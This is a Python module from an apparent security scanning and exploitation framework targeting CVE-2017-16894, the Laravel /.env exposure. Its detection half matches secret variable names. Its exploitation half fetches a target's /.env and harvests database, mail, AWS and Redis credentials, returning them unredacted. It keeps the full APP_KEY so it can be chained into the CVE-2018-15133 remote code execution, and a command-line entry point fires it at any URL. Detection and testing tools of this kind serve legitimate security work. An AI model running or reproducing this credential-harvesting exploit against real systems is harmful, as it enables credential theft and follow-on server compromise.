#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2017-16894')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2017-16894 — Laravel .env Disclosure (SAFE DETECTOR)

Summary:
    Laravel versions ≤ 5.5.21 may expose the /.env file if the framework
    writes it with incorrect permissions. If /.env is publicly accessible,
    attackers may retrieve sensitive credentials.

This module performs SAFE read‑only detection:

 ✔ Sends GET /.env
 ✔ Checks status codes and content
 ✔ Detects presence of hard secrets (DB, MAIL, AWS, APP_KEY)
 ✔ Does NOT write files or exploit anything
"""

import re
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

SENSITIVE_ENV_PATTERNS = [
    r"APP_KEY\s*=",
    r"DB_PASSWORD\s*=",
    r"DB_USERNAME\s*=",
    r"MAIL_PASSWORD\s*=",
    r"AWS_SECRET_ACCESS_KEY\s*=",
    r"REDIS_PASSWORD\s*=",
]

sensitive_re = re.compile("|".join(SENSITIVE_ENV_PATTERNS), re.IGNORECASE)

# Capture the APP_KEY VALUE (not just presence) so the detector can surface it as a
# structured artifact a downstream app_key-gated consumer can chain on. Matches both the
# canonical `base64:<44 chars>` form and a bare value; quotes are stripped by the caller.
_APP_KEY_LINE_RE = re.compile(r"^\s*APP_KEY\s*=\s*(.+?)\s*$", re.IGNORECASE | re.MULTILINE)


def _extract_app_key(body: str):
    """Return the APP_KEY value from a /.env body (quote-stripped), or None."""
    m = _APP_KEY_LINE_RE.search(body or "")
    if not m:
        return None
    val = m.group(1).strip().strip('"').strip("'").strip()
    return val or None


def scan(target_url, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2017-16894",
        "name": "Laravel .env Sensitive Information Exposure",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
    }

    env_url = base + "/.env"
    result["endpoint"] = env_url

    try:
        r = sess.get(env_url, timeout=6, verify=False)
    except Exception as e:
        result["error"] = f"Request failed: {e}"
        return result

    # ------------------------------------------------------------------
    # Step 1 — Check if file is exposed
    # ------------------------------------------------------------------
    if r.status_code not in (200, 206):
        result["evidence"].append(f".env returned HTTP {r.status_code}")
        return result

    body = r.text or ""

    # ------------------------------------------------------------------
    # Step 2 — Check for sensitive variables
    # ------------------------------------------------------------------
    if sensitive_re.search(body):
        result["vulnerable"] = True
        result["status"] = "confirmed_vulnerable"
        result["verdict"] = "confirmed_vulnerable"
        result["proof_type"] = "read_only"
        result["detection_methods"].append("env_exposure")
        result["evidence"].append("Sensitive variables found in /.env response")
        # Surface the recovered APP_KEY VALUE as a structured artifact (not just presence) so the
        # exploitation driver can auto-chain it into an app_key-gated consumer (CVE-2018-15133 etc.)
        # WITHOUT the operator passing --app-key. Uses artifacts["app_key"] to match the producer
        # EXPLOIT (modules/cves/cve_2017_16894.py) and the loot-harvest contract in check.py.
        app_key = _extract_app_key(body)
        if app_key:
            result.setdefault("artifacts", {})["app_key"] = app_key
            result["detection_methods"].append("app_key_recovered")
            result["evidence"].append("Recovered APP_KEY value from /.env (chainable)")
    else:
        result["evidence"].append("File accessible but no sensitive patterns found")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2017-16894 exploitation half — Laravel /.env info disclosure.

Split from the original modules/cve_2017_16894.py (detection half: modules/cves/cve_2017_16894.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ---------------------------------------------------------------------------
# Exploitation (info_disclosure)
# ---------------------------------------------------------------------------
# Keys whose VALUE is worth dumping when the .env is web-reachable. APP_KEY is
# the headline secret (precondition for CVE-2018-15133 X-XSRF-TOKEN deserial-
# ization RCE); DB / MAIL / AWS / REDIS creds are the standard credential leak.
_SECRET_KEYS = (
    "APP_KEY",
    "DB_HOST",
    "DB_DATABASE",
    "DB_USERNAME",
    "DB_PASSWORD",
    "MAIL_USERNAME",
    "MAIL_PASSWORD",
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "REDIS_PASSWORD",
)

_ENV_LINE_RE = re.compile(
    r"^\s*(" + "|".join(_SECRET_KEYS) + r")\s*=\s*(.*)$",
    re.IGNORECASE | re.MULTILINE,
)


def _redact(key: str, value: str) -> str:
    """Show enough of a secret to prove disclosure without splatting it whole."""
    v = value.strip().strip('"').strip("'")
    if not v:
        return "<empty>"
    # APP_KEY is the load-bearing artifact for chaining — keep it intact so the
    # evidence is actionable (it is already public the moment /.env is served).
    if key.upper() == "APP_KEY":
        return v
    if len(v) <= 6:
        return v[0] + "***" if len(v) > 1 else "***"
    return f"{v[:3]}***{v[-2:]} (len={len(v)})"


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    """Retrieve the web-exposed Laravel /.env and dump the disclosed secrets.

    info_disclosure class: success iff the protected .env is retrievable over
    HTTP and contains recognizable secrets. No command execution; the recovered
    APP_KEY is surfaced as an artifact (chains to CVE-2018-15133).
    """
    sess = session or http_config.get_auth_session()
    result = {
        "cve": "CVE-2017-16894",
        "attempted": True,
        "success": False,
        "vuln_class": "info_disclosure",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    try:
        if not isinstance(target_url, str) or not target_url.strip():
            result["attempted"] = False
            result["reason"] = "no target_url provided"
            return result

        url = target_url.strip()
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        env_url = url.rstrip("/") + "/.env"
        result["artifacts"]["endpoint"] = env_url

        try:
            r = sess.get(env_url, timeout=10, verify=False)
        except Exception as e:
            result["reason"] = f"request to {env_url} failed: {e}"
            result["requires"] = ["network_reachable_target"]
            return result

        if r.status_code not in (200, 206):
            result["reason"] = (
                f"/.env returned HTTP {r.status_code} — not web-exposed "
                "(remediated or correct docroot)"
            )
            result["detail"] = f"GET {env_url} -> HTTP {r.status_code}; nothing disclosed"
            return result

        body = r.text or ""
        matches = _ENV_LINE_RE.findall(body)
        if not matches:
            result["reason"] = (
                "/.env is served (HTTP 200) but no recognizable secrets were found"
            )
            result["detail"] = f"GET {env_url} -> HTTP 200 ({len(body)} bytes), no secrets"
            return result

        # De-dupe while preserving order; first value per key wins.
        secrets = {}
        for k, v in matches:
            ku = k.upper()
            if ku not in secrets:
                secrets[ku] = v.strip()

        app_key = secrets.get("APP_KEY") or None
        # Strip surrounding quotes from APP_KEY for downstream use.
        if app_key:
            app_key = app_key.strip().strip('"').strip("'")

        ev_lines = [f"GET {env_url} -> HTTP {r.status_code} ({len(body)} bytes) — .env disclosed"]
        for k in _SECRET_KEYS:
            if k in secrets:
                ev_lines.append(f"  {k} = {_redact(k, secrets[k])}")

        result["success"] = True
        result["evidence"] = "\n".join(ev_lines)
        result["artifacts"]["secrets"] = {k: secrets[k] for k in secrets}
        if app_key:
            result["artifacts"]["app_key"] = app_key
        result["detail"] = (
            f"Disclosed {len(secrets)} secret(s) via public /.env"
            + ("; recovered APP_KEY (enables CVE-2018-15133)" if app_key else "")
        )
        return result

    except Exception as e:  # never raise to caller
        result["success"] = False
        result["reason"] = f"unexpected error during exploitation: {e}"
        return result


if __name__ == "__main__":
    import json
    import sys

    tgt = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    print(json.dumps(exploit(tgt), indent=2))
